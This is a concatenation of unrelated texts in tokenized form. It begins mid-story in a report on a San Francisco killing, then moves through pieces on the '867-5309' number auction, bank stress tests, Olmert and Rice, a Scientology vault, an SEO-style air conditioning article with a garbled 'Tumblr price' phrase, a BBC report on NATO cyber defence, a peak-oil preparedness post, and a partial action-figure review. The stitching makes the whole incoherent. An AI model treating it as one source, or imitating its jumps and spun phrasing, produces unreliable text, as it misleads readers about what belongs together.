McIlvenna faces 10 years in prison and Mehrara faces eight years when the women are sentenced April 3 in San Francisco Superior Court .
Erica Derryck , spokeswoman for the district attorney 's office , said the only witnesses to the crime were the perpetrators .
" We believe this disposition ensured the toughest sentence , " she said .
Gorenman was a Russian immigrant who grew up in Walnut Creek , graduated from UC Berkeley and worked as a computer engineer with Pacific Gas and Electric Co .
Police homicide investigators focused on the three women after one of Gorenman 's credit cards was used to buy a cell phone after he was found dead .
The buyer said he had stolen the card from three girls he met in downtown San Francisco .
He led police to a house in San Bruno where McIlvenna and Gutierrez were living together .
McIlvenna eventually told police that she and her friends had been targeting men - striking up conversations with them with the goal of getting their cash and property .
McIlvenna told authorities that she and three other teenage girls had enticed Gorenman to Fort Funston after he pulled up alongside them at a traffic light on Fulton Street .
One of the four girls was never charged .
As the girls walked with him near a World War II bunker , Gutierrez shot Gorenman in the head , and Mehrara took his wallet , McIlvenna told authorities .
Gutierrez then drove away in Gorenman 's car , took off the license plates and abandoned it in the Bayview district , McIlvenna said .
After the killing , the defendants had a falling out and eventually McIlvenna agreed to testify .
Gutierrez 's attorney , Tony Tamburello , said the killing was " a tragic event , and the three young women - two of them were minors at the time - are taking responsibility for it . "
" It 's difficult to understand why and how it happened , " Tamburello said .
" But they are taking responsibility - that 's the bottom line . "
( CNN ) -- Jenny 's phone number is for sale , but not for a song .
" 867-5309 / Jenny " originally appeared on Tommy Tutone 's " Tommy Tutone 2 " album .
Bids for a New Jersey version of the number , stuck in the minds of millions since Tommy Tutone 's " 867-5309 / Jenny " hit the Top 10 in 1982 , had reached $ 5,100 on eBay as of Monday morning .
The song is about a guy who finds Jenny 's name and number scribbled on a bathroom wall .
" This is really , in my opinion , one of the last cultural remnants of the ' 80s pop culture era ... other than the mullet , " said Spencer Potter , a 28 - year - old DJ who is selling the number he got for free five years ago .
While Potter is overlooking the fact that " 867-5309 " is an active phone number in dozens of other area codes , it does get called a lot by curious people .
Potter said he has gotten about 40 calls a day since he got the area code 201 version for his Weehawken , New Jersey , DJ business .
" The minute we plugged the phone jack into the wall , it began ringing , " Potter said .
Mostly , Potter said , the callers are " a lot of ' 80s fanatics " and he lets the calls ring through to his voice mail .
When he did answer a call three years ago , Potter found his own Jenny on the line .
" She had been using my number to give out to guys that she did n't like at bars , " he said .
" It was a bum phone number . "
The young lady from Hoboken , New Jersey , told Potter she was just curious about who might be getting the calls .
Potter ended up asking her out .
" I figured if she was having to give out a bum number that often then she was probably pretty cute , " he said .
" We ended up meeting for drinks .
We dated for awhile and it was actually a great friendship . "
Potter recently moved from Weehawken and decided to try to make money off the infamous digits with an eBay auction .
Potter 's DJ business goes with the number , a necessary provision to get around phone company rules against selling telephone numbers , he said .
Phone companies technically own the numbers , not the customers .
Potter said Vonage , the company that assigned the number , gave him permission to transfer it as part of the sale of his business .
EBay halted a 2004 auction by the purported holder of the 212 area code version of the number , The New York Times reported .
A Philadelphia - area resident who holds the toll - free versions -- both 800 and 888 -- said he values his numbers in the millions .
Jeffrey Steinberg said his best offer so far , rejected several years ago , was for $ 1 million from a national weight - loss company .
He acquired the numbers in the early 1990s for a pizza delivery campaign and has licensed them for other advertisers in the years since .
Potter said when his auction ends next Monday , February 9 , he hopes to make at least $ 40,000 .
He said he would use the money to take a Caribbean vacation -- away from his ringing phone .

WASHINGTON  The Obama administration ordered the nation ’s 19 biggest banks on Wednesday to undergo stress tests to check whether they could hold up if the economy deteriorated further .
But analysts say the administration ’s worst projections , which it describes as unlikely , are not much more dire than what many private forecasters already expect .
According to the new Treasury Department guidelines , the banks would have to assume that the economy contracts by 3.3 percent this year and remains almost flat in 2010 .
They would also have to assume that housing prices fall another 22 percent this year and that unemployment would shoot to 8.9 percent this year and hit 10.3 percent in 2010 .
“ I do n’t think they are harsh enough , ” said David Hendler , an analyst at CreditSights , who said the dire projection was itself too optimistic about the growth that would be generated from President Obama ’s stimulus program .
“ That would be a pleasant outcome , but you have to plan for the worst . ”
The US and Israel offered conflicting accounts today over alleged Israeli intervention to prevent the US voting for a United Nations ceasefire resolution last week , a move that apparently left the US secretary of state , Condoleezza Rice , humiliated .
The Israeli prime minister , Ehud Olmert , speaking at a meeting in Ashkelon in southern Israel last night , claimed that he had been forced to call George Bush , the US president , to override Rice .
According to Olmert , Rice had been planning to vote with the other members of the security council for the resolution .
But the resolution was passed with 14 votes for , and one abstention .
Olmert , in a speech in Hebrew , is reported to have said : " When we saw that the secretary of state , for reasons we did not really understand , wanted to vote in favour of the UN resolution ...
I looked for President Bush and they told me he was in Philadelphia making a speech .
" I said , ' I do n't care .
I have to talk to him now ' .
They got him off the podium , brought him to another room and I spoke to him .
I told him , ' You ca n't vote in favour of this resolution . '
He said , ' Listen , I do n't know about it , I did n't see it , I 'm not familiar with the phrasing . ' "
Olmert said : " He gave an order to the secretary of state and she did not vote in favour of it - a resolution she cooked up , phrased , organised and manoeuvred for .
She was left pretty shamed and abstained on a resolution she arranged . "
Gordon Johndroe , a White House spokesman , said today : " I 've seen these press reports .
They are inaccurate . "
Olmert 's version coincides with the one offered up by other members of the security council the day after the vote .
It is also known that Rice had been planning a press conference before the vote but abruptly cancelled it to take a call from Bush .
SWEENEY CANYON , Wyo . -
The construction began last summer , stirring up dust that wafted down this desert valley and into a small community of off - the - grid homes .
As many as 20 heavy trucks a day hauling construction materials and equipment rumbled down the valley 's main gravel road , passing into a gate marked with a " No Trespassing " sign .
Helicopters flew in sling loads of cargo .
Powerful work lights lit up the valley at night .
Public planners in southwest Wyoming 's Sweetwater County - a sagebrush expanse roughly the size of Massachusetts - say the contractor hired for the project has told them it intends to build a 22,000 - square - foot underground storage vault to store documents .
Whose documents exactly ?
Apparently , the writings of the late L. Ron Hubbard , the Church of Scientology 's founder , and other church records .
But plans remain vague .
County land use planner John Barton said the county also has been told the vault might hold any number of things besides documents .
" We 've had everything from underground housing of sheep or hay , " Barton said .
" We 've had cemetery discussed .
We 've had mining discussed . "
The contractor , International Ground Support Systems of Santa Fe , N.M. , also has said it plans to build a 3,500 - square - foot caretaker house and an airstrip , county officials say .
But they allege that IGSS has failed to apply for two required permits for work done so far .
The mysterious project has riled some neighbors , who value the solitude of their remote community , located about 150 miles east of Salt Lake City .
" I do n't care if it 's Church of Scientology , the Roman Catholic Church or , you know , Kraft Foods , " Barton said .
" We have development activity occurring - has occurred and , rumor has it , continues to occur - without required permits . "
A local attorney representing IGSS , Robert Reese , said the earthwork already done is similar to improvements that would be made at any ranch .
He said that 's consistent with the site 's agricultural zoning and past use as a cattle ranch .
Therefore , he said , the contractor has n't needed to get a permit .
" Our position is that everything that has been done so far falls well within the agricultural use and no permit is required , " Reese said .
IGSS has a majority ownership stake in the 3,500 - acre property along with a handful of locals who otherwise do n't appear to be directly involved in the project , according to county officials .
Neither the Los Angeles - based Church of Scientology - a roughly 50 - year - old religion noted for its unconventional beliefs and celebrity followers - nor IGSS officials returned several phone messages seeking more information about the project .
However , an entity called the Church of Spiritual Technology has been known to build underground vaults to store Scientology documents , including near Petrolia , Calif. , and Trementina , N.M. According to records from Humbolt County , Calif. , IGSS received a permit in 1990 to build the Petrolia vault for the Church of Spiritual Technology , which is based in Los Angeles .
The Church of Spiritual Technology does n't have a listed phone number .
The Church of Spiritual Technology and the Church of Scientology are linked , according to Larry Brennan , of Bow , N.H. , a former Scientologist who now writes a blog about the religion .
The Church of Spiritual Technology holds Scientology 's copyrights and trademarks and stores church documents in underground vaults to preserve the religion in case of nuclear war , he said .
The developer 's lack of permits prompted the county to issue a stop - work order in September .
When work did n't stop , the planners referred the matter to County Attorney Brett Johnson , who said he 's contemplating legal action if work continues without a permit .
" There 's been a lot of earth moved .
It 's quite clear that they 're preparing to do a lot more work and we just want them to come in and get the proper permits , " Johnson said .
John Ledford lives in a solar - powered home within sight of the construction zone .
He said the project has stirred up considerable dust and he worries that the construction could cause his water well to run dry .
" They 've ruined the road , and we live with the fact that the road has gotten ruined .
But the air and the water ?
It 's just not right , " Ledford said .
IGSS attorney Reese said that far from doing harm , the company has improved the property .
" They 're doing nothing but agricultural work out there in the last couple of months , " Reese said .
" They 've got grazing permits , cattle are being raised , they were cleaning stream beds , fixing up the property , getting a lot of trash out there .
It 's much nicer than it was . "
During the hot seasons of the year , you should make sure that your home is cool .
It is uncomfortable to have an air conditioning system that is not working in the right way .
It is during the hot season that you will be required to do frequent repairs of your system because it overworks .
For you to be guaranteed of high - level comfort , you should ensure that you have an air conditioning service near you to help fix problems immediately they arise .
There are many air conditioning services in the market , but you should only entrust your system to the best and most reliable service .
Here are ways to help do the right selection .
Word of mouth
Word of mouth is one of the best ways that you can determine the best air conditioning service to hire .
It might seem to be a very traditional way , but it works best since you get information from people with prior knowledge concerning the quality of air conditioning services offered by the different professionals .
Some of the people you can trust to provide you with information include friends , neighbors , family members and other property owners .
They can provide you with reliable information on the quickest and most reliable service to hire .
Find on the web
Nowadays , the internet has become the most reliable source of information in all industries .
Thus , it is possible for you to get the best air conditioning service by going through the web .
The great thing is that the internet has thousands of services to compare and get the best among all of them .
The most crucial thing here is to make sure that you check reputation , experience , reviews and cost charged by the different services .
Besides , always work with the one located closest to your home .
This ensures that you can get emergency services quickly since they can access your home fast any time of the day or even at night .
Work with a service with vast experience
As you make your decision , you must take into consideration the level of experience the different services have in this industry .
It is to your advantage if you can work with a service with more than six years offering the services to clients .
A service with vast experience will work hard to offer the most satisfactory services .
They can also work on your system fast since they have all the skills and tools required to do any size of repair work .
License
You might be in a hurry to have your air conditioning system repaired until you forget to check whether your potential service has a valid license .
No matter how quick you want the work to be done , make sure that you only work with a service that is permitted by the authorities to offer these services .
A license is also a clear indication that service has the right qualifications in this industry .
Finally , do not forget to work with an air conditioning service charging the best Tumblr price according to your budget .

Security correspondent , BBC News
Nato officials have told the BBC their computers are under constant attack from organisations and individuals bent on trying to hack into their secrets .
The attacks keep coming despite the establishment of a co-ordinated cyber defence policy with a quick - reaction cyber team on permanent standby .
The cyber defence policy was set up after a wave of cyber attacks on Nato member Estonia in 2007 , and more recent attacks on Georgia - so what are they defending against and how do they do it ?
Tower of Babel Nato 's operational headquarters in Mons is a low , drab three - storey building - part of a sprawling complex set in rolling farmland south of Brussels .
Nato officials refuse to say who they think is behind the attacks
The blue and white flag of the 26 - nation alliance flutters in the cold breeze alongside the spangled banner of the EU .
Inside the canteen it is like a Tower of Babel with almost every language of Europe competing to be heard above the clatter of trays and dishes .
Our escort , a German army officer in immaculate uniform , leads us down a corridor to a hushed room where 20 or so military analysts sit hunched over computers ; their desert boots and camouflage fatigues strangely out of place for a windowless room in Belgium .
This , explains Chris Evis , is the Incident Management Section , which he heads .
" We face the full gamut of threats .
It varies from your kiddie who 's just trying to gain street cred amongst his friends to say he 's just defaced a Nato system to more focused targeted attacks against Nato information " .
Cyber attacks are not new - websites were being hacked into and brought down during the Kosovo war 10 years ago .
Cyber attack can bring down a complete national service , banking , media
Suleyman Anil
Nato Security Office
But when Estonia came under sustained cyber attack from Russian sympathisers in 2007 , the alliance realised it needed a proper cyber defence policy and fast .
Suleyman Anil , a Turkish IT expert from the Nato Security Office is the man driving much of that policy .
" Estonia was the first time , in a large scale , [ that we saw ] possible involvement of state agencies ; that the cyber attack can bring down a complete national service , banking , media ... the other particular trait everyone is struggling to deal with ... is lots of cyber espionage going on " .
Mr Anil reveals that there has been more than one incidence of Nato officials being socially profiled , and then subjected to " targeted trojans " .
He explains how their unseen adversaries gather as much information as possible about the individual then send them an email purporting to come from a friend or a relative .
Trojan horse
If they open the attachment then a sophisticated " worm " or " trojan " can , in theory , take over their computer , scan its files , send them on , delete them , or perhaps most damagingly , alter them without the user knowing .
This sort of activity goes on every day in the commercial world but for a military organisation like Nato there are obvious risks .
Chris Evis is at pains to point out that any material classified as " secret " is transmitted only internally , by secure intranet , rather than using the world wide web .
The gravest cyber threat to Nato is somebody altering the data without our knowing about it and finding out too late in the action
Chris Evis
Incident Management Section , Nato
But what happens , I ask , when someone mistakenly sends secret material over the internet ?
The answer , it seems , is sitting in the corner of the room .
An Italian sergeant , who looks young enough to still be at school , is painstakingly scanning emails that have been automatically quarantined because they contain buzzwords like " Nato secret " .
A glance over his shoulder reveals emails to and from Sarajevo , Baghdad and Kabul , evidence of Nato 's newly expanded horizons .
They look innocuous enough and most of the time , explains the sergeant , it is a false alarm but sometimes even quite senior officers have transgressed and they get a serious talking to about online security .
Serious threats
When it comes to cyber espionage , Nato officials refuse to say who they think is behind the attacks , in fact our escorts can hardly wait to steer us off the subject .
Even if they were certain that they were originating , say , in China or Russia , it would be very hard for them to prove , so tortuous is the trail in cyberspace .
Instead , Chris Evis is happy to talk about how the threat is being tackled , explaining that they have a number of analysts who are constantly reviewing information , looking for the more serious threats .
" We have [ about ] 100 sensors at the moment deployed at something close to 30 different sites across the Nato countries ... one of these sensors could be on the east coast of the United States , one could be in London , one could be in Iraq and a number of them could be in Afghanistan .
All that information is simultaneously feeding back to us at the centre here . "
So is cyber warfare the future of warfare ?
Chris
Evis says he believes it will be a factor within any future conflict .
" I think the gravest cyber threat to Nato is somebody altering the data without our knowing about it and [ our ] finding out too late in the action , " he says .
" So when it 's quiet it 's probably too quiet , because there 's always activity out there . "

We know that peak oil will be here soon , and we feel like we should be doing something .
But what ?
It is frustrating to know where to start .
In this post , I will discuss a few ideas about what we as individuals can do .
I wrote this post back in August 2007 .
Back when I wrote the post , we were pre-peak oil .
Now , it seems to me that we are most likely post - peak oil .
Much of the advice from back then would still hold , however .
One thing I did n't get right was which direction gasoline prices would go .
Also , while I touched on financial issues , I did n't try to emphasize them .
I can see now that financial issues are likely to be as big a problem as I feared .
1 . What will the first few years after peak oil be like ?
It is hard to know for certain , but a reasonable guess is that the impact will be like a major recession or depression .
Many people will be laid off from work .
Gasoline is likely to be very expensive ( $ 10 a gallon or more ) and may not be available , except in limited quantities after waiting in line for a long time .
Fewer goods of all types will be available in stores .
Imports from third - world countries are likely to be especially unavailable , because of the impact of the oil shortage on their economies .
Money may not have the same value as previously - - opinion is divided as to whether deflation or rampant inflation will be a problem .
Investments , even those previously considered safe , are likely to lose value .
Things we take for granted -- like bottled water , fast food restaurants , and dry cleaners -- may disappear fairly quickly .
Electricity may become less reliable , with more frequent outages .
Airplane tickets are likely to be extremely expensive , or only available with a special permit based on need .
2 . If a scenario like this is coming , what can a person do now ?
Here are a few ideas :
• Visit family and friends now , especially those at a distance .
This may be more difficult to do in the future .
• Learn to know your neighbors .
It is likely that you will need each other 's help more in the future .
• If you live by yourself , consider moving in with friends or relatives .
In tough times , it is better to have others to rely on .
It is also likely to be a lot cheaper .
• Buy a bicycle that you can use as alternate transportation , if the need arises .
• Start walking or jogging for exercise .
Get yourself in good enough physical condition that you could walk a few miles if you needed to .
• Take care of your physical health .
If you need dental work or new glasses , get them .
Do n't put off immunizations and other preventive medicine .
These may be more difficult to get , or more expensive , later .
• Move to a walkable neighborhood .
If it seems likely that you will be able to keep your job , move closer to your job .
• Trade in your car for one with better mileage .
If you have a SUV , you can probably sell it at a better price now than in the future .
• If you have two cars powered by gasoline , consider trading one for a diesel - powered vehicle .
That way , if gasoline ( or diesel ) is not available , you will still have one car you can drive .
• Make sure that you have at least a two - week supply of food and water , if there is some sort of supply disruption .
It is always good to have some extra for an emergency -- the likelihood of one arising is greater now .
• Keep reasonable supplies of things you may need in an emergency -- good walking shoes , boots , coats , rain wear , blankets , flashlights and batteries ( or wind - up flashlights ) .
• Take up hobbies that you will be able to continue in a low energy world , such as gardening , knitting , playing a musical instrument , bird watching , or playing cards with neighbors .
• Join a local sustainability group or " permaculture " group and start learning about sustainable gardening methods .
3 . Do I need to do more than these things ?
It really depends on how much worse things get , and how quickly .
If major services like electricity and water remain in place for many years , and if gasoline and diesel remain reasonably available , then relatively simple steps will go a a long way .
Some steps that might be helpful to add once the crunch comes include :
• Join a carpool for work , or make arrangements to work at home .
If public transportation is available , use it .
• Cut out unnecessary trips .
Eat meals at home .
Take your lunch to work .
Walk or jog in your neighborhood rather than driving to the gym .
Order from the internet or buy from stores you can walk to , rather than driving alone to stores .
• If you live a distance from shopping , consider forming a neighborhood carpool for grocery and other shopping .
Do this for other trips as well , such as attending church .
If closer alternatives are available , consider them instead .
• Plant a garden in your yard .
Put in fruit or nut trees .
Make a compost pile , and use it in your garden .
Put to use what you learned in sustainability or permaculture groups .
• Meat , particularly beef , is likely to be very expensive .
Learn to prepare meals using less meat .
Make casseroles like your grandmother 's , making a small amount of meat go a long way .
Or make soup using a little meat plus vegetables or beans .
• Use hand - me - down clothing for younger children .
Or have a neighborhood garage sale , and trade clothing with others near you .
4 . Should families continue to have two , three , or four children , as they often do today ?
With the uncertainties ahead , it would be much better if families were very small -- one child , or none at all .
The world 's population has grown rapidly in the last 100 years .
Part of the reason for growth is the fact that with oil and natural gas , it was possible to grow much more food than in the past .
As we lose the use of these fossil fuels , it is likely that we will not be able to produce as much food as in the past , because of reduced ability to irrigate crops , and reduced availability of fertilizers , insecticides , and herbicides .
In addition , manufactured goods of all types , including clothing and toys , are likely to be less available , with declining fossil fuel supply .
Having smaller families will help fit the population to the available resources .
If couples have completed their families , it would probably be worthwhile for them to consider a permanent method of contraception , since birth control may be less available or more expensive .
5 . Are there any reasons why steps such as those outlined in Question 3 might be too little to handle the problem ?
Besides the decline in oil production , there are a number of other areas of concern .
Hopefully , most of these will never happen , or if they do happen , will not occur for several years .
If they do happen , greater measures than those outlined in Question 3 are likely to be needed .
• Collapse of the financial system .
Our financial system needs growth to sustain it , so that loans can be paid back with interest .
Once peak oil hits , growth will be gone .
Economic growth may even be replaced with economic decline .
It is not clear our financial system can handle this .
• Collapse of foreign trade .
Many factors may come into play :
The cost of transportation will be higher .
Airline transport may not be available at all .
Fewer goods are likely to be produced by the poorer countries of the world , because of power outages related to high oil prices .
Rapid inflation / deflation may make monetary transactions more difficult .
• Rapid climate change .
Recently , scientists have discovered that climate change can take place over a very short period of time -- as little as a decade or two .
Temperature and precipitation changes may cause crop failures , and may make some areas no longer arable .
Sea levels may also rise .
• Failure of the electrical grid .
The grid tends to be vulnerable to many kinds of problems -- including deterioration due to poor maintenance , damage during storms , and attacks in times of civil unrest .
Maintenance is currently very poor ( grade of D ) according to the " Report Card on America 's Infrastructure " by the American Society of Civil Engineers .
If we cannot maintain the grid , and upgrade it for the new wind and solar capacity being added , we will all be in the dark .
• Water shortages .
There are several issues -- We are drawing down some aquifers at unsustainable rates , and these may be depleted .
Climate change may reduce the amount of water available , by melting ice caps and changing storm patterns .
City water and sewer systems require considerable energy inputs to continue functioning .
If these are not provided , the systems will stop .
Finally , systems must also be adequately maintained -- something that is neglected currently .
• Road deterioration .
If we do n't have roads , it does n't matter whether we have cars .
In the future , asphalt ( a petroleum product ) is expected to become more and more expensive and less available .
It is not clear whether recycling asphalt from lesser - used roads will overcome this difficulty .
• Decline in North American natural gas production .
Natural gas is especially used for home heating , making plastics and making fertilizer .
It is also used in electrical generation , particularly for extra load capacity when demand is high .
Conventional natural gas is declining , and it is not clear that supply from other sources can make up the gap .
• Inadequate mineral supplies .
A number of minerals are becoming less avaialble , including copper ( used in electric wiring ) , platinum ( used in catalytic converters ) , phosphorous ( used in fertilizer ) .
• Fighting over available supplies .
This could happen at any level .
Individuals with inadequate food or gasoline may begin using violence .
Or there may be fighting among groups within a nation , or between nations .
6 . Are there any reasons for optimism ?
Yes .
We know that people throughout the ages have gotten along successfully with far fewer resources than we have now , and with much less foreign trade .
Financial systems have gotten into trouble in the past , and eventually new systems have replaced them .
If nothing else , barter works .
We know that among the countries of the world , the United States , Canada , and Russia have reasonably good resource endowments in relation to their populations .
They have fairly large amounts of land for crops , moderate rainfall , reasonable amounts of fossil fuels remaining , and populations that are not excessively large .
We also know that Cuba successfully made a transition from high oil usage to much lower oil usage , through the development of local gardens , increased public transit , and bicycles .
A movie has been made about the Cuban experience .
7 . What should we do , if we want to do more than described in Question 3 ?
Some web sites ( such as Life After the Oil Crash and wtdwtshtf.com ) advocate moving to a farming area , buying land and hand tools , and learning to farm without fossil fuels .
Typically , an individual purchases an existing farmhouse and adds solar panels or a windmill .
The web sites generally recommend storing up large supplies of food , clothing , medicine , tools , guns , and ammunition , and learning a wide range of skills .
These sites also suggest storing some things ( liquor , razor blades , aspirin , etc. ) for purposes of barter .
This approach may work for a few people , but it has its drawbacks .
Making such a big move is likely to be expensive , and will most likely involve leaving one 's job .
The individual will be alone , so security may be a problem .
The individual may be dependent on his or her own resources for most things , especially if the farm is in a remote location .
If the weather is bad , crops may fail .
Living on the edge of a small town may prevent some problems , but such a move would still be a major undertaking .
8 . How about Ecovillages ?
What are they ?
These are communities dedicated to the idea of sustainable living .
These communities were set up in response to many issues facing the world , including global warming , resource depletion , and lifestyles that are not fulfilling .
They were generally not formed with peak oil in mind .
Each ecovillage is different .
Organizers often buy a large plot of land and lay out a plan for it .
Individuals buy into the organization .
Homes may be made from sustainable materials , such as bales of straw .
Gardening is generally done using " permaculture " - a sustainable organic approach .
Individuals may have assigned roles in the community .
The few ecovillages I investigated did not seem to truly be sustainable -- they bought much of their food and clothing from outside , and made money by selling tours of their facilities .
The ecovilliage approach could theoretically be expanded to provide self - sustaining post - peak oil communities , but would require some work .
Some adventuresome readers may want to try this approach .
9 . Is there a middle ground ?
What should be people be doing now , if they want to do more than outlined in Questions 2 and 3 , but are n't ready to immerse themselves in a new lifestyle ?
As a middle ground , people need to start thinking seriously about how to maintain their own food and water security , and start taking steps in that direction .
Food security .
We certainly hope our current system of agriculture will continue without interruption , but there is no guarantee of this .
Our current method is very productive , but uses huge amounts of energy .
If we can keep our current system going , its productivity would likely be higher than that of a large number of individual gardens .
The concern is that eventually the current system may break down due to reduced oil supply and need to be supplemented .
Vulnerabilities include :
• Making hybrid seed , and transporting it to farmers
• Getting diesel fuel to the farmers who need it
• Transporting food to processing centers by truck
• Creating processed food in energy - intensive factories
• Making boxes and other containers for food
• Transporting processed food to market
If diesel fuel is allocated by high price alone , farmers may not be able to afford fuel , and may drop out .
Or truck drivers may not be able to get what they need .
It is in our best interest to have a back - up plan .
The one most often suggested is growing gardens in our yards -- even front yards .
Another choice is encouraging local farms , so that transportation is less of an issue .
It takes several years to get everything working well ( new skills learned , fruit trees to reach maturity ) , so we need to start early .
One type of crop that is particularly important is grain , since grain provides a lot of calories and stores well .
In some parts of the country , potatoes might be a good substitute .
It would be good if people started planting grain in gardens in their yards .
There is a lot to learn in order to do this , including learning which grains grow well , how much moisture and nutrients the grains need , and how to process them .
If the grain that grows well is unfamiliar , like amaranth , there is also a need to learn how to use it in cooking .
Individuals ( or local farms ) should also begin growing other foods that grow well in their areas , including fruits and nuts , greens of various types , and other more traditional garden crops , including beans .
For all types of gardening , open pollinated seeds ( sometimes called heirloom seeds ) are probably best for several reasons :
• It makes storing seeds after harvest possible , and reduces dependence on hybrid seeds .
• There is less uniformity , so the harvest is spread over a longer period .
• The reduced uniformity also helps prevent crop failure in years with drought or excessive rain .
Some seeds will not grow , but others will .
( Hybrids are all or nothing . )
Imported foods are likely to shrink in supply more quickly than other foods .
If you live in a country that is dependent on imported foods , you may want to consider moving elsewhere .
Water Security .
Here , the largest issue is whether there is likely to be sufficient supply in your area .
Another issue is whether there will be sufficient water for your garden , at appropriate times .
A third issue is whether there will be disruptions in general , because of poor maintenance or because the process of treating fresh water ( and sewage ) is energy - intensive .
With respect to sufficient water in your area , if it looks like there is a problem ( desert Southwest , for example ) , relocating now rather than later is probably a good idea .
Transporting water is energy intensive , and new efforts at developing energy ( like shale oil or more ethanol ) are likely to make the water supply situation even worse .
With respect to water for gardening , consider a rainwater catchment system for your roof .
Runoff water is saved in barrels , and can be used for irrigation in dry periods .
General disruptions of water supply are more difficult .
Keep some bottled water on hand .
You may also want to consider a tank for greater storage supply .
Rainwater catchment can be used for drinking water , with the correct type of roofing ( not asphalt shingles ! ) and proper treatment , but this is not generally legal in the United States .
10 .
What kind of investments should I be making ?
A person 's first priority should be buying at least a little protection for a rainy day - some extra food and water , comfortable clothing , blankets and flashlights .
I suggested two weeks worth in Question 2 .
If you have money and space , you may want to buy more .
Paying down debt is probably a good idea , if only for the peace of mind it brings .
There are some possible scenarios where debt is not a problem ( hyper- inflation but you keep your existing job and get a raise ) .
In many other scenarios ( deflation ; job lay - offs ; rising food and energy prices ) debt is likely to be even harder to pay off than it is now .
Land for a garden is probably a good investment , as well as garden tools .
You will want to invest in gardening equipment , some books on permaculture , and perhaps some heirloom seeds .
You may also want to consider a rainwater catchment system , to collect water from your roof .
You may also want to invest in solar panels for your home .
If you want round - the - clock solar energy , you will also need back - up batteries .
Buying these is questionable -- they tend to be very expensive , require lots of maintenance , and need to be replaced often .
There is a possibility that the financial system will run into difficulty in the not - too - distant future .
Some ideas for investments that may protect against this are
• Treasury Inflation - Protected Securities ( TIPS )
• Bank accounts protected by the FDIC
• Gold coins
• Silver coins
If you want to invest in the stock market , we know that there will be more and more drilling done for oil and gas done in the next few years , so companies making drilling equipment are likely to do well .
Small independent oil and gas companies may also do well , doing " work - over " business .
We know that there are likely to be shortages in some metals in the years ahead ( copper , platinum , uranium ) , so shares in companies mining these types of metals may do well .
Investments in biofuels should be considered with caution .
Most ethanol from corn appears to be heavily dependent on subsidies .
If it should ever have to compete with other fuels on a level playing ground , it is likely to do poorly .
I would be cautious about buying insurance policies , except for short - term needs such as automobile coverage , homeowners coverage , and term life insurance .
If we encounter a period of significant deflation , insurance companies are likely to fail , because bondholders cannot pay their debt .
If we run into a period of rapid inflation , the life insurance or long term care coverage you buy may have very little real value when you come to use it .
11 . Should I move to a different location ?
There are many reasons you might want to consider moving to a different location :
• To find something less expensive .
If times are going to be difficult , you do not want to be paying most of your income on a mortgage or rent .
• To be closer to friends or family , in the difficult times ahead .
• To share a house or apartment with friends or family .
• To be closer to work or public transportation .
• To be closer to a type of employment that you believe will have a better chance of continuing in the future .
• To have better fresh water supplies .
• To join a community with similar interests in sustainability .
• To leave a community that you feel may be prone to violence , in time of shortage .
There are disadvantages as well as advantages to moving to a new location .
If many others are trying to move at the same time , you may not be welcome in the new community .
You will likely not have friends and the support group you would have had in your prior location .
Because of these issues , it is probably better to move sooner , rather than later , if you are going to move .
If you balance the pluses and the minuses , it may be better to stay where you are .
12 . We hear a lot about various things we can do to be " green " , like buying fluorescent light bulbs .
Do these save oil ?
Most of the " green " ideas you read about save energy of some kind , but not necessarily oil .
Even so , they are still a good idea .
If there is a shortage of one type of energy , it tends to affect other types of energy as well .
Doing “ green ” things is also helpful from a global warming perspective .
Here are some green ideas besides using fluorescent light bulbs :
• Move to a smaller house or apartment .
• Insulate your house , and have it professionally sealed to keep out drafts .
• If any rooms are unused , do not heat and cool them .
• Keep your house warmer in summer , and cooler in winter .
• If you no longer need a big refrigerator , buy a smaller one .
Be sure it is an " Energy Star " refrigerator .
• If you have more than one refrigerator , get rid of the extra(s ) .
Refrigerators are a big source of energy use .
For parties , use ice in a tub .
• Separate freezers are also big energy users .
Consider doing without .
• Eat less meat .
Also avoid highly processed foods and bottled water .
All of these require large amounts of energy for production .
• Get power strips and turn off appliances that drain energy when not in use .
• Turn off lights that are not needed .
• Rewire lights into smaller " banks " , so you do not need to light up the whole basement when all you want is light in a small corner .
• Get a clothes line , so you do not need to use your clothes dryer .
• When cooking , use the microwave whenever possible .
• Reduce air travel to a minimum .
Air travel results in a huge number of miles of travel with corresponding fuel use .
• Recycle whenever you can .
• Eliminate disposables as much as possible ( coffee cups , napkins , plastic bags , etc. )
13 . Should we be talking to our local government officials about these problems ?
Yes !
At the local level , there are many changes that would be helpful :
• Laws permitting people to put up clothes lines in their yards .
• Laws encouraging gardens to be grown , even in the front yards of homes .
• Laws permitting multiple occupancy of houses by unrelated individuals .
• New local public transportation plans , particularly ones that do not require large outlay of funds .
For example , a plan that is more like a glorified car pool might work .
• Allocation of funds to study the best crops to be grown in the area , and the best cultivation methods , if energy supplies are much lower in the future .
It would also be helpful to make changes at higher levels of government , but these are beyond the scope of the discussion in this post .
14 .
What other resources might we look at to get ideas about what is ahead what we might do now ?
The Community Solution is an organization that puts on an annual sustainability conference and issues reports on energy - related solutions .
Global Public Media has a number of talks on relocalization .
Closing the Collapse Gap is a humorous talk by Dmitry Orlov .
The Soviet Union collapsed in 1990 , and its oil production dropped about that time .
Dmitry compares the US situation to that of the USSR .
Rolling Stone has a short summary of The Long Emergency , a book by James Howard Kunstler .

Q14 -5 : Summary of The Long Emergency by James Howard Kunstler , March 24 , 2005
http://www.rollingstone.com/news/story/7203633/the_long_emergency
Packaging - ***
The box was pretty beat up on the one I received , but it 's no big deal for me since these are all openers .
If you do want to keep the box for later storage or sale , you 'll be happy to know it 's all very collector friendly , and you wo n't have to damage anything to get the pieces out .
With this big of a box , I 'd like more text and graphics of course , but it 's a minor nit .
Even as beat up as mine was , the figure inside the interior plastic trays was perfectly safe .
Sculpting - ***1/2
Like most of Kotobukiya 's work , there 's a nice realistic level of detail here , not so much as to be busy , but enough to make the Pilot look like an actual character .
I was n't too sure about the pose at first , but it grew on me over time .
Koto has given you two sets of arms , so the Pilot can either be posed holding his blaster in both hands , or pointing it at some unlikely individual .
There 's nice detail work on the helmet and chest plate , although I 'm sure that major fans of the films will be able to find inaccuracies .
For me , they looked about right , and the proportions of the head , torso and arms are excellent .
I do think the thighs are a tad big .
This is another minor nit though , and the guy must just be a big Stair Master fan .
The Pilot stands about 11 " tall in his deep crouch , and he 's billed as 1/7th scale .
He 's pretty damn close to 1/6th scale though , and with the crouched pose , could probably fit in with figures like Medicom Star Wars .
Paint - ***1/2
When you go with basic black for your outfit , there really is n't a lot of paint to screw up .
Still , you have to find a way to make all that black still look good on your body - or on the shelf .
Kotobukiya does that with various finishes for the black outfit .
The pieces that would be made from harder materials ( the helmet , chest plate , etc. ) are a very high gloss black .
